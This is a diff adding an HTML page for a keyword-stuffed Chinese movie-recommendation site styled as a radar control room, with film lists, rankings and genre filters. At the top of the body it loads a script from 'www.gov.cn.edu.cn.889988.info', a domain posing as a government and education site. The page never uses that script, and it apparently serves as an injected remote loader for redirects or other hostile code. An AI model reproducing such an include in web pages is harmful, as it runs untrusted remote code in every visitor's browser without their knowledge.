@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>360电影网 - 360°全景监控影视推荐站 | https://360dianyingwang-top.github.io</title>
+<meta name="description" content="360电影网(https://360dianyingwang-top.github.io)采用360°全景监控室与雷达扫描风格，提供全景片单、类型通道、监控排行榜与影讯日志，移动端自适应，适合必应收录与影视检索。">
+<meta name="keywords" content="360电影网,360dianyingwang-top,360度电影,全景影视,雷达推荐,电影片单,类型通道,在线观看">
+<meta name="author" content="360电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://360dianyingwang-top.github.io">
+<meta property="og:title" content="360电影网 - 360°全景监控影视推荐站">
+<meta property="og:description" content="360电影网提供全景片单、类型通道、监控排行榜与影讯日志，雷达扫描风格。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://360dianyingwang-top.github.io">
+<style>
+:root{
+  --bg:#070b14;--bg2:#0b1222;--panel:#0e172b;--panel2:#13203a;
+  --line:#1f3358;--radar:#37e0c8;--radar2:#2bb6ff;--alert:#ff5d73;
+  --gold:#ffce4d;--text:#dff3ff;--dim:#8fb0cf;--mono:"Courier New",ui-monospace,Menlo,Consolas,monospace;
+  --sans:-apple-system,"Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  --radius:12px;--shadow:0 10px 30px rgba(0,0,0,.45);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);line-height:1.65;overflow-x:hidden;
+  background-image:radial-gradient(900px 480px at 10% -10%,rgba(43,182,255,.10),transparent 60%),
+   radial-gradient(820px 460px at 100% 0%,rgba(55,224,200,.08),transparent 58%),
+   radial-gradient(700px 380px at 50% 120%,rgba(255,206,77,.05),transparent 60%);}
+a{text-decoration:none;color:inherit;}
+
+/* 导航 */
+.navbar{position:sticky;top:0;z-index:1000;background:rgba(7,11,20,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line);}
+.nav-box{max-width:1200px;margin:0 auto;padding:0 16px;height:62px;display:flex;align-items:center;justify-content:space-between;}
+.brand{font-family:var(--mono);font-weight:900;letter-spacing:1px;font-size:1.05rem;color:var(--text);display:flex;align-items:center;gap:8px;}
+.brand i{font-style:normal;color:var(--radar);text-shadow:0 0 10px rgba(55,224,200,.5);}
+.brand .badge{font-size:.66rem;color:var(--bg);background:var(--radar);padding:2px 6px;border-radius:5px;margin-left:6px;}
+.nav-links{list-style:none;display:flex;gap:4px;}
+.nav-links a{padding:9px 13px;border-radius:8px;font-size:.85rem;font-weight:700;color:var(--dim);transition:.2s;}
+.nav-links a:hover,.nav-links a.active{color:var(--bg);background:linear-gradient(135deg,var(--radar),var(--radar2));}
+.m-btn{display:none;background:var(--panel2);color:var(--radar);border:1px solid var(--line);border-radius:8px;padding:8px 12px;font-size:1.1rem;cursor:pointer;}
+.container{max-width:1200px;margin:0 auto;padding:24px 16px 40px;}
+
+/* 状态条 */
+.statusbar{display:flex;gap:14px;flex-wrap:wrap;align-items:center;border:1px solid var(--line);background:var(--panel);border-radius:10px;padding:10px 14px;margin-bottom:18px;}
+.statusbar .dot{width:9px;height:9px;border-radius:50%;background:var(--radar);box-shadow:0 0 0 3px rgba(55,224,200,.22);}
+.statusbar .txt{font-family:var(--mono);font-size:.78rem;color:var(--dim);}
+.statusbar .txt b{color:var(--radar);}
+
+/* Hero 雷达 */
+.hero{display:grid;grid-template-columns:1fr 360px;gap:18px;margin-bottom:26px;}
+.console{background:linear-gradient(160deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:var(--radius);padding:26px;position:relative;overflow:hidden;box-shadow:var(--shadow);}
+.console:before{content:"";position:absolute;inset:0;background:
+  repeating-linear-gradient(0deg,transparent 0 31px,rgba(43,182,255,.05) 31px 32px),
+  repeating-linear-gradient(90deg,transparent 0 31px,rgba(55,224,200,.04) 31px 32px);pointer-events:none;}
+.console .tag{display:inline-block;font-family:var(--mono);font-size:.7rem;letter-spacing:2px;color:var(--bg);background:linear-gradient(135deg,var(--radar),var(--radar2));padding:4px 10px;border-radius:6px;font-weight:900;margin-bottom:12px;}
+.console h1{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:900;line-height:1.15;margin-bottom:10px;font-family:var(--mono);}
+.console h1 em{color:var(--radar);font-style:normal;text-shadow:0 0 10px rgba(55,224,200,.5);}
+.console h1 span{color:var(--radar2);}
+.console p{color:var(--dim);font-size:.92rem;max-width:640px;margin-bottom:14px;}
+.domain{display:inline-block;font-family:var(--mono);font-size:.76rem;color:var(--radar2);border:1px dashed var(--radar2);padding:8px 12px;border-radius:8px;margin-bottom:16px;}
+.cta{display:inline-block;background:linear-gradient(135deg,var(--radar),var(--radar2));color:#04121a;font-weight:900;font-size:.85rem;padding:12px 24px;border-radius:30px;transition:.2s;box-shadow:0 8px 22px rgba(43,182,255,.25);}
+.cta:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(43,182,255,.4);}
+
+/* 雷达盘 */
+.radarbox{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:18px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;}
+.radar{position:relative;width:240px;height:240px;border-radius:50%;border:1px solid var(--line);background:
+  radial-gradient(circle,rgba(55,224,200,.10),transparent 70%),conic-gradient(from 0deg,transparent 0deg,rgba(55,224,200,.18) 60deg,transparent 90deg);
+  animation:sweep 6s linear infinite;overflow:hidden;}
+.radar:before{content:"";position:absolute;inset:0;border-radius:50%;background:
+  repeating-radial-gradient(circle,transparent 0 28px,rgba(43,182,255,.12) 28px 29px);}
+.radar:after{content:"";position:absolute;left:50%;top:50%;width:2px;height:2px;background:var(--radar);box-shadow:0 0 0 4px rgba(55,224,200,.25);border-radius:50%;transform:translate(-50%,-50%);}
+@keyframes sweep{to{transform:rotate(360deg);}}
+.blip{position:absolute;width:8px;height:8px;border-radius:50%;background:var(--gold);box-shadow:0 0 8px rgba(255,206,77,.8);}
+.b1{left:34%;top:30%;} .b2{left:62%;top:44%;} .b3{left:48%;top:66%;} .b4{left:70%;top:70%;}
+.radar-leg{font-family:var(--mono);font-size:.74rem;color:var(--dim);text-align:center;}
+.radar-leg b{color:var(--radar);}
+
+/* 区块 */
+.sec{margin:28px 0;}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.sec-title{font-size:1.22rem;font-weight:900;font-family:var(--mono);display:flex;align-items:center;gap:9px;color:var(--text);}
+.sec-title:before{content:"◎";color:var(--radar);}
+.more{font-family:var(--mono);font-size:.78rem;font-weight:700;color:var(--radar);padding:6px 12px;border:1px solid var(--radar);border-radius:8px;background:rgba(55,224,200,.07);}
+.more:hover{background:var(--radar);color:#04121a;}
+
+/* 通道列表 */
+.channels{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+.ch-row{display:grid;grid-template-columns:84px 1fr auto;gap:14px;align-items:center;padding:13px 18px;border-bottom:1px solid var(--line);}
+.ch-row:last-child{border-bottom:none;}
+.ch-no{font-family:var(--mono);font-weight:900;font-size:.78rem;color:var(--bg);background:linear-gradient(135deg,var(--radar2),var(--radar));padding:6px 0;text-align:center;border-radius:6px;}
+.ch-main .nm{font-weight:800;font-size:.92rem;} .ch-main .ds{font-size:.74rem;color:var(--dim);}
+.ch-bar{height:7px;border-radius:99px;background:#08101f;margin-top:6px;overflow:hidden;}
+.ch-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--radar),var(--radar2),var(--gold));}
+.ch-rate{font-family:var(--mono);font-weight:900;color:var(--gold);white-space:nowrap;font-size:.85rem;}
+
+/* 全景球卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;}
+.orbit{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:14px;transition:.2s;position:relative;overflow:hidden;}
+.orbit:hover{transform:translateY(-5px);border-color:var(--radar);box-shadow:0 12px 28px rgba(43,182,255,.16);}
+.sphere{height:150px;border-radius:10px;position:relative;display:flex;align-items:center;justify-content:center;font-size:2.6rem;margin-bottom:12px;
+  background:radial-gradient(circle at 30% 25%,rgba(55,224,200,.25),transparent 45%),radial-gradient(circle at 75% 75%,rgba(43,182,255,.25),transparent 45%),#0a1326;
+  border:1px solid var(--line);overflow:hidden;}
+.sphere:before{content:"";position:absolute;inset:0;background:repeating-radial-gradient(circle at 50% 50%,transparent 0 18px,rgba(143,176,207,.10) 18px 19px);}
+.sphere .ring{position:absolute;width:120%;height:120%;border-radius:50%;border:1px dashed rgba(55,224,200,.25);animation:spin 18s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.sphere .yr{position:absolute;left:8px;top:8px;font-family:var(--mono);font-size:.66rem;color:var(--bg);background:var(--gold);padding:3px 7px;border-radius:5px;font-weight:900;}
+.sphere .view{position:absolute;right:8px;bottom:8px;font-family:var(--mono);font-size:.68rem;color:var(--radar);border:1px solid var(--radar);padding:2px 7px;border-radius:5px;background:rgba(7,11,20,.5);}
+.orbit .info{padding:2px 2px 4px;}
+.orbit .name{font-weight:800;font-size:.9rem;margin-bottom:4px;}
+.orbit .meta{font-size:.72rem;color:var(--dim);display:flex;justify-content:space-between;gap:6px;font-family:var(--mono);}
+.orbit .tag{margin-top:8px;font-family:var(--mono);font-size:.7rem;color:var(--radar);}
+
+/* 排行榜 */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.rcol{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;}
+.rcol h3{font-family:var(--mono);font-size:1rem;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--line);color:var(--radar);}
+.ritem{display:grid;grid-template-columns:30px 1fr auto;gap:10px;align-items:center;padding:9px 0;border-bottom:1px solid rgba(143,176,207,.10);}
+.ritem:last-child{border-bottom:none;}
+.rnum{font-family:var(--mono);font-weight:900;width:28px;height:28px;display:flex;align-items:center;justify-content:center;background:#08101f;border:1px solid var(--line);border-radius:8px;color:var(--radar);}
+.rnum.top{background:linear-gradient(135deg,var(--radar),var(--radar2));color:#04121a;border:none;}
+.rname{font-weight:700;font-size:.88rem;} .rtag{font-size:.7rem;color:var(--dim);font-family:var(--mono);}
+.rscore{font-family:var(--mono);font-weight:900;color:var(--gold);}
+
+/* 类型 */
+.chips{display:flex;flex-wrap:wrap;gap:10px;}
+.chip{font-family:var(--mono);padding:9px 15px;border:1px solid var(--line);background:var(--panel);border-radius:999px;font-size:.8rem;font-weight:700;color:var(--dim);cursor:pointer;transition:.2s;}
+.chip:hover,.chip.on{background:linear-gradient(135deg,var(--radar),var(--radar2));color:#04121a;border-color:transparent;}
+
+/* 日志 */
+.logs{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;font-family:var(--mono);font-size:.82rem;}
+.log-row{display:grid;grid-template-columns:96px 1fr auto;gap:12px;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line);}
+.log-row:last-child{border-bottom:none;}
+.log-time{color:var(--radar2);}
+.log-msg .t{font-weight:700;color:var(--text);} .log-msg .d{font-size:.72rem;color:var(--dim);}
+.log-flag{font-size:.72rem;font-weight:900;padding:3px 8px;border-radius:5px;}
+.log-flag.ok{color:var(--bg);background:var(--radar);}
+.log-flag.warn{color:var(--bg);background:var(--gold);}
+.log-flag.hot{color:#fff;background:var(--alert);}
+
+footer{border-top:1px solid var(--line);background:var(--panel);margin-top:40px;padding:34px 16px;text-align:center;}
+.foot-brand{font-family:var(--mono);font-weight:900;font-size:1.2rem;color:var(--radar);margin-bottom:10px;}
+.foot-links{display:flex;justify-content:center;gap:18px;margin-bottom:14px;flex-wrap:wrap;}
+.foot-links a{color:var(--dim);font-size:.82rem;} .foot-links a:hover{color:var(--radar);}
+footer p{font-size:.76rem;color:var(--dim);margin:4px 0;}
+footer .kw{margin-top:10px;color:var(--radar);font-weight:700;font-family:var(--mono);}
+
+@media(max-width:980px){.hero{grid-template-columns:1fr;}.rank{grid-template-columns:1fr;}}
+@media(max-width:760px){.m-btn{display:block;}.nav-links{display:none;position:absolute;left:0;right:0;top:62px;background:var(--bg);flex-direction:column;padding:10px 16px;border-bottom:1px solid var(--line);}.nav-links.open{display:flex;}.nav-links a{padding:11px 12px;}.grid{grid-template-columns:1fr 1fr;}}
+@media(max-width:460px){.console{padding:20px;}.grid{grid-template-columns:1fr;}.ch-row{grid-template-columns:64px 1fr;}.ch-rate{grid-column:2;}.radar{width:200px;height:200px;}.log-row{grid-template-columns:78px 1fr;}.log-flag{grid-column:2;}}
+</style>
+</head>
+<body>
+
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="navbar">
+  <div class="nav-box">
+    <a href="#" class="brand"><i>360°</i>电影网<span class="badge">PANORAMA</span></a>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home" class="active">监控台</a></li>
+        <li><a href="#channels">全景通道</a></li>
+        <li><a href="#pano">全景片单</a></li>
+        <li><a href="#rank">监控排行榜</a></li>
+        <li><a href="#type">类型扫描</a></li>
+        <li><a href="#logs">影讯日志</a></li>
+      </ul>
+    </nav>
+    <button class="m-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="container">
+  <div class="statusbar">
+    <span class="dot"></span>
+    <span class="txt">SYSTEM: <b>ONLINE</b></span>
+    <span class="txt">CHANNELS: <b>18</b></span>
+    <span class="txt">SCAN: <b>360°/24H</b></span>
+    <span class="txt">DOMAIN: <b>https://360dianyingwang-top.github.io</b></span>
+  </div>
+
+  <section class="hero" id="home">
+    <div class="console">
+      <span class="tag">RADAR CINEMA · 全景检索</span>
+      <h1>360电影网｜<em>360°</em>全景 <span>雷达荐片</span></h1>
+      <p>把选片做成监控室：按全景通道、类型扫描、监控排行榜与影讯日志归档。360电影网用雷达扫盘覆盖剧情、动作、科幻、悬疑、喜剧与文艺，避免漏掉任一度好片。</p>
+      <div class="domain">https://360dianyingwang-top.github.io</div><br>
+      <a href="#channels" class="cta">◎ 启动全景扫描</a>
+    </div>
+    <div class="radarbox">
+      <div class="radar"><span class="blip b1"></span><span class="blip b2"></span><span class="blip b3"></span><span class="blip b4"></span></div>
+      <div class="radar-leg">RADAR SWEEP <b>0→360°</b><br>匹配片单 / 类型 / 评分信号</div>
+    </div>
+  </section>
+
+  <section class="sec" id="channels">
+    <div class="sec-head"><h2 class="sec-title">全景通道 · 片单扫描</h2><a href="#" class="more">全部通道 ›</a></div>
+    <div class="channels" id="channelList">
+      <div class="ch-row" data-g="剧情"><div class="ch-no">CH01</div><div class="ch-main"><div class="nm">肖申克的救赎</div><div class="ds">剧情/励志 · 希望叙事与长线人物弧</div><div class="ch-bar"><i style="width:98%"></i></div></div><div class="ch-rate">9.8</div></div>
+      <div class="ch-row" data-g="科幻"><div class="ch-no">CH02</div><div class="ch-main"><div class="nm">星际穿越</div><div class="ds">科幻/剧情 · 时空尺度与管风琴低频</div><div class="ch-bar"><i style="width:95%"></i></div></div><div class="ch-rate">9.3</div></div>
+      <div class="ch-row" data-g="动作"><div class="ch-no">CH03</div><div class="ch-main"><div class="nm">黑暗骑士</div><div class="ds">动作/犯罪 · 小丑对抗与城市秩序</div><div class="ch-bar"><i style="width:96%"></i></div></div><div class="ch-rate">9.6</div></div>
+      <div class="ch-row" data-g="悬疑"><div class="ch-no">CH04</div><div class="ch-main"><div class="nm">看不见的客人</div><div class="ds">悬疑/推理 · 反转与时间线重构</div><div class="ch-bar"><i style="width:92%"></i></div></div><div class="ch-rate">9.0</div></div>
+      <div class="ch-row" data-g="喜剧"><div class="ch-no">CH05</div><div class="ch-main"><div class="nm">楚门的世界</div><div class="ds">喜剧/剧情 · 真人秀隐喻与自由</div><div class="ch-bar"><i style="width:93%"></i></div></div><div class="ch-rate">9.2</div></div>
+      <div class="ch-row" data-g="文艺"><div class="ch-no">CH06</div><div class="ch-main"><div class="nm">花样年华</div><div class="ds">文艺/爱情 · 旗袍、雨巷与克制情感</div><div class="ch-bar"><i style="width:90%"></i></div></div><div class="ch-rate">8.9</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="pano">
+    <div class="sec-head"><h2 class="sec-title">全景片单 · 球体封面</h2><a href="#" class="more">更多球体 ›</a></div>
+    <div class="grid" id="movieGrid">
+      <a href="#" class="orbit" data-g="剧情"><div class="sphere"><span class="ring"></span><span class="yr">1994</span><span class="view">360°</span>🎞️</div><div class="info"><div class="name">肖申克的救赎</div><div class="meta"><span>剧情/励志</span><span>9.8</span></div><div class="tag">希望/越狱长线</div></div></a>
+      <a href="#" class="orbit" data-g="科幻"><div class="sphere"><span class="ring"></span><span class="yr">2014</span><span class="view">360°</span>🪐</div><div class="info"><div class="name">星际穿越</div><div class="meta"><span>科幻/剧情</span><span>9.3</span></div><div class="tag">黑洞/五维空间</div></div></a>
+      <a href="#" class="orbit" data-g="动作"><div class="sphere"><span class="ring"></span><span class="yr">2008</span><span class="view">360°</span>🦇</div><div class="info"><div class="name">黑暗骑士</div><div class="meta"><span>动作/犯罪</span><span>9.6</span></div><div class="tag">哥谭/小丑对峙</div></div></a>
+      <a href="#" class="orbit" data-g="悬疑"><div class="sphere"><span class="ring"></span><span class="yr">2016</span><span class="view">360°</span>🕵️</div><div class="info"><div class="name">看不见的客人</div><div class="meta"><span>悬疑/推理</span><span>9.0</span></div><div class="tag">密室/多重反转</div></div></a>
+      <a href="#" class="orbit" data-g="喜剧"><div class="sphere"><span class="ring"></span><span class="yr">1998</span><span class="view">360°</span>📺</div><div class="info"><div class="name">楚门的世界</div><div class="meta"><span>喜剧/剧情</span><span>9.2</span></div><div class="tag">真人秀/自由隐喻</div></div></a>
+      <a href="#" class="orbit" data-g="文艺"><div class="sphere"><span class="ring"></span><span class="yr">2000</span><span class="view">360°</span>👗</div><div class="info"><div class="name">花样年华</div><div class="meta"><span>文艺/爱情</span><span>8.9</span></div><div class="tag">王家卫/旗袍美学</div></div></a>
+      <a href="#" class="orbit" data-g="科幻"><div class="sphere"><span class="ring"></span><span class="yr">1999</span><span class="view">360°</span>💊</div><div class="info"><div class="name">黑客帝国</div><div class="meta"><span>科幻/动作</span><span>9.4</span></div><div class="tag">红蓝药丸/矩阵</div></div></a>
+      <a href="#" class="orbit" data-g="动作"><div class="sphere"><span class="ring"></span><span class="yr">2010</span><span class="view">360°</span>🌀</div><div class="info"><div class="name">盗梦空间</div><div class="meta"><span>科幻/动作</span><span>9.5</span></div><div class="tag">多层梦境/陀螺</div></div></a>
+    </div>
+  </section>
+
+  <section class="sec" id="rank">
+    <div class="sec-head"><h2 class="sec-title">监控排行榜</h2><a href="#" class="more">完整排行 ›</a></div>
+    <div class="rank">
+      <div class="rcol">
+        <h3>🎯 全景评分 TOP5</h3>
+        <a href="#" class="ritem"><div class="rnum top">1</div><div><div class="rname">肖申克的救赎</div><div class="rtag">剧情/励志 · 长线人物弧</div></div><div class="rscore">9.8</div></a>
+        <a href="#" class="ritem"><div class="rnum top">2</div><div><div class="rname">黑暗骑士</div><div class="rtag">动作/犯罪 · 城市秩序</div></div><div class="rscore">9.6</div></a>
+        <a href="#" class="ritem"><div class="rnum top">3</div><div><div class="rname">盗梦空间</div><div class="rtag">科幻/动作 · 多层梦境</div></div><div class="rscore">9.5</div></a>
+        <a href="#" class="ritem"><div class="rnum">4</div><div><div class="rname">黑客帝国</div><div class="rtag">科幻/动作 · 矩阵世界</div></div><div class="rscore">9.4</div></a>
+        <a href="#" class="ritem"><div class="rnum">5</div><div><div class="rname">星际穿越</div><div class="rtag">科幻/剧情 · 时空尺度</div></div><div class="rscore">9.3</div></a>
+      </div>
+      <div class="rcol">
+        <h3>📡 近期热扫 TOP5</h3>
+        <a href="#" class="ritem"><div class="rnum top">1</div><div><div class="rname">奥本海默</div><div class="rtag">传记/历史 · 核爆声场</div></div><div class="rscore">8.9</div></a>
+        <a href="#" class="ritem"><div class="rnum top">2</div><div><div class="rname">沙丘2</div><div class="rtag">科幻/战争 · 沙漠全景</div></div><div class="rscore">8.7</div></a>
+        <a href="#" class="ritem"><div class="rnum top">3</div><div><div class="rname">坠落的审判</div><div class="rtag">悬疑/剧情 · 法庭录音</div></div><div class="rscore">8.6</div></a>
+        <a href="#" class="ritem"><div class="rnum">4</div><div><div class="rname">可怜的东西</div><div class="rtag">科幻/喜剧 · 怪诞重构</div></div><div class="rscore">8.5</div></a>
+        <a href="#" class="ritem"><div class="rnum">5</div><div><div class="rname">美国小说</div><div class="rtag">喜剧/剧情 · 类型反讽</div></div><div class="rscore">8.4</div></a>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="type">
+    <div class="sec-head"><h2 class="sec-title">类型扫描</h2><a href="#" class="more">重置 ›</a></div>
+    <div class="chips" id="chips">
+      <button class="chip on" data-g="all">全部 ALL</button>
+      <button class="chip" data-g="剧情">剧情</button>
+      <button class="chip" data-g="科幻">科幻</button>
+      <button class="chip" data-g="动作">动作</button>
+      <button class="chip" data-g="悬疑">悬疑</button>
+      <button class="chip" data-g="喜剧">喜剧</button>
+      <button class="chip" data-g="文艺">文艺</button>
+      <button class="chip" data-g="犯罪">犯罪</button>
+      <button class="chip" data-g="动画">动画</button>
+    </div>
+  </section>
+
+  <section class="sec" id="logs">
+    <div class="sec-head"><h2 class="sec-title">影讯日志</h2><a href="#" class="more">更多日志 ›</a></div>
+    <div class="logs">
+      <div class="log-row"><div class="log-time">10-03 10:02</div><div class="log-msg"><div class="t">全景片单同步：新增科幻/动作8部</div><div class="d">更新星际穿越、盗梦空间、黑客帝国等球体封面与评分信号。</div></div><div class="log-flag ok">OK</div></div>
+      <div class="log-row"><div class="log-time">10-02 21:40</div><div class="log-msg"><div class="t">类型扫描告警：悬疑频道热度上升</div><div class="d">看不见的客人、坠落的审判点击信号增强，建议置顶推荐。</div></div><div class="log-flag warn">WARN</div></div>
+      <div class="log-row"><div class="log-time">10-01 09:15</div><div class="log-msg"><div class="t">监控排行榜刷新：近期热扫TOP5重算</div><div class="d">按公开评分、类型覆盖与上新频率生成雷达推荐位。</div></div><div class="log-flag hot">HOT</div></div>
+      <div class="log-row"><div class="log-time">09-30 18:00</div><div class="log-msg"><div class="t">系统维护：雷达扫盘参数校准0→360°</div><div class="d">优化类型去重与片单去重，核心内容保持静态可抓取。</div></div><div class="log-flag ok">OK</div></div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="foot-brand">360°电影网 · PANORAMA CINEMA</div>
+  <div class="foot-links">
+    <a href="#">关于我们</a><a href="#">免责声明</a><a href="#">片单合作</a><a href="#">联系我们</a>
+  </div>
+  <p>https://360dianyingwang-top.github.io</p>
+  <p>360电影网 - 360°全景监控影视推荐站，提供全景片单、类型通道、监控排行榜与影讯日志。</p>
+  <p class="kw">关键词：360电影网、360dianyingwang-top、360度电影、全景影视、雷达推荐、电影片单、类型通道</p>
+  <p>© 2024 360电影网（演示站）保留所有权利</p>
+</footer>
+
+<script>
+(function(){
+  var mBtn=document.getElementById('mBtn'),nav=document.getElementById('navLinks');
+  mBtn.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){var a=e.target.closest('a');if(!a)return;
+    nav.querySelectorAll('a').forEach(function(x){x.classList.remove('active');});a.classList.add('active');
+    if(window.innerWidth<=760){nav.classList.remove('open');}});
+
+  var chips=document.getElementById('chips'),grid=document.getElementById('movieGrid'),cl=document.getElementById('channelList');
+  function filter(g){
+    if(grid)grid.querySelectorAll('.orbit').forEach(function(c){c.style.display=(g==='all'||c.getAttribute('data-g')===g)?'':'none';});
+    if(cl)cl.querySelectorAll('.ch-row').forEach(function(r){r.style.display=(g==='all'||r.getAttribute('data-g')===g)?'':'none';});
+  }
+  if(chips){chips.addEventListener('click',function(e){var b=e.target.closest('.chip');if(!b)return;
+    chips.querySelectorAll('.chip').forEach(function(x){x.classList.remove('on');});b.classList.add('on');filter(b.getAttribute('data-g'));});}
+
+  document.querySelectorAll('.orbit,.cta,.more').forEach(function(el){
+    el.addEventListener('click',function(e){if(el.classList.contains('chip'))return;e.preventDefault();
+      el.style.transform='scale(.97)';setTimeout(function(){el.style.transform='';},150);});
+  });
+})();
+</script>
+</body>
+</html>
